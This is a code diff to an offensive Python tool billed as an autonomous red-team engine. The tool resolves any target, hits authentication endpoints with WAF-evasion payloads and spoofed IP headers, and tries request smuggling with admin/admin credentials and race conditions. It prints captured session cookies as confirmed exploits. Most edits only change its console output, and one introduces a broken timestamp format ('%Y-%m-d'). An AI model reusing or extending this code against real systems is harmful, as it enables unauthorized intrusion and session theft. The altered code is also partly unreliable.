@@ -115,17 +115,20 @@ async def test_race_condition_async(host, port, path, payload, use_ssl, concurre
 async def run_autonomous_engine(target_host, credentials_list=None, options=None):
     """
     Elite Autonomous Red-Team Engine: WAF Bypass, IP Spoofing, Schema Mutation, 
-    and Race Condition Exploitation with optimized non-blocking output.
+    and Race Condition Exploitation with zero-lag live terminal streaming.
     """
     try:
         resolved_ip = socket.gethostbyname(target_host)
-        print(f"\n\033[96m[*] Resolving target domain: {target_host} -> {resolved_ip}\033[0m")
+        sys.stdout.write(f"\n\033[96m[*] Resolving target domain: {target_host} -> {resolved_ip}\033[0m\n")
+        sys.stdout.flush()
     except socket.gaierror:
-        print(f"\n\033[91m[!] Fatal: Target resolution failed for '{target_host}'.\033[0m")
+        sys.stdout.write(f"\n\033[91m[!] Fatal: Target resolution failed for '{target_host}'.\033[0m\n")
+        sys.stdout.flush()
         return [], 0
 
     start_time = time.time()
-    print(f"\n\033[95m[***] ENGAGING RUTHLESS OFFENSIVE ENGINE W/ WAF EVASION [{target_host}] [***]\033[0m")
+    sys.stdout.write(f"\n\033[95m[***] ENGAGING RUTHLESS OFFENSIVE ENGINE W/ WAF EVASION [{target_host}] [***]\033[0m\n")
+    sys.stdout.flush()
     
     target_paths = [
         "/api/auth/callback/credentials",
@@ -157,20 +160,22 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
     target_port = 443
     use_ssl = True
 
-    print(f"[*] Dispatched advanced payload permutations with dynamic IP rotation & header spoofing...")
+    sys.stdout.write(f"[*] Dispatched advanced payload permutations with dynamic IP rotation & header spoofing...\n")
+    sys.stdout.flush()
 
     for path in target_paths:
-        print(f"\033[90m[*] Probing endpoint route: {path} ({len(payloads)} mutations)...\033[0m")
+        sys.stdout.write(f"\033[90m[*] Probing endpoint route: {path} ({len(payloads)} mutations)...\033[0m\n")
+        sys.stdout.flush()
         
-        # 1. Standard Multi-Vector Permutations with IP Spoofing (Throttled console feedback)
+        # 1. Standard Multi-Vector Permutations with IP Spoofing
         for payload in payloads:
             status, headers, body, is_vuln, vuln_type = await test_endpoint_differential_async(
                 resolved_ip, target_port, path, payload, use_ssl
             )
             
-            # Only print output for non-standard or interesting return codes to prevent terminal freeze
             if status in [200, 201, 302, 401, 403, 500]:
-                print(f"       └── [CODE {status}] Route: {path}")
+                sys.stdout.write(f"       └── [CODE {status}] Route: {path}\n")
+                sys.stdout.flush()
 
             if is_vuln:
                 hit_data = {
@@ -181,13 +186,14 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
                     "cookies": headers.get("Set-Cookie", ""),
                     "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                 }
-                print(f"\n\033[92m[+++] VERIFIED EXPLOIT CONFIRMED! Type: {vuln_type} on {path} (Status: {status})\033[0m")
+                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE VERIFIED EXPLOIT CONFIRMED [***]\033[0m\n")
+                sys.stdout.write(f"  ├── Type     : \033[92m{vuln_type}\033[0m\n")
+                sys.stdout.write(f"  ├── Endpoint : {path}\n")
+                sys.stdout.write(f"  ├── Status   : {status}\n")
+                sys.stdout.write(f"  └── Cookies  : \033[92m{hit_data['cookies'][:40]}...\033[0m\n")
+                sys.stdout.flush()
+                
                 hits.append(hit_data)
-                
-                os.makedirs("reports/sessions", exist_ok=True)
-                with open("reports/sessions/compromised_session.json", "w") as f:
-                    json.dump(hit_data, f, indent=4)
-                
                 return hits, time.time() - start_time
 
         # 2. HTTP Request Smuggling Anomaly Probe
@@ -200,7 +206,10 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
                 resolved_ip, target_port, path, {"user": "admin", "pass": "admin"}, use_ssl, smuggle_headers=s_header
             )
             if is_vuln:
-                print(f"\n\033[92m[+++] REQUEST SMUGGLING ANOMALY CONFIRMED on {path} (Status: {status})\033[0m")
+                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE REQUEST SMUGGLING ANOMALY [***]\033[0m\n")
+                sys.stdout.write(f"  ├── Endpoint : {path}\n")
+                sys.stdout.write(f"  └── Status   : \033[92m{status}\033[0m\n")
+                sys.stdout.flush()
 
         # 3. Race Condition State Stress Test
         r_status, r_headers, r_body, r_vuln, r_type = await test_race_condition_async(
@@ -211,12 +220,17 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
                 "type": r_type,
                 "endpoint": path,
                 "status": r_status,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                "timestamp": time.strftime("%Y-%m-d %H:%M:%S")
             }
-            print(f"\n\033[92m[+++] RACE CONDITION EXPLOIT CONFIRMED on {path}!\033[0m")
+            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE RACE CONDITION EXPLOIT CONFIRMED [***]\033[0m\n")
+            sys.stdout.write(f"  ├── Endpoint : {path}\n")
+            sys.stdout.write(f"  └── Status   : \033[92m{r_status}\033[0m\n")
+            sys.stdout.flush()
+            
             hits.append(hit_data)
             return hits, time.time() - start_time
 
     duration = time.time() - start_time
-    print(f"\n\033[33m[*] Autonomous validation concluded in {duration:.2f}s. Perimeter verified.\033[0m")
+    sys.stdout.write(f"\n\033[33m[*] Autonomous validation concluded in {duration:.2f}s. Perimeter verified.\033[0m\n\n")
+    sys.stdout.flush()
     return hits, duration
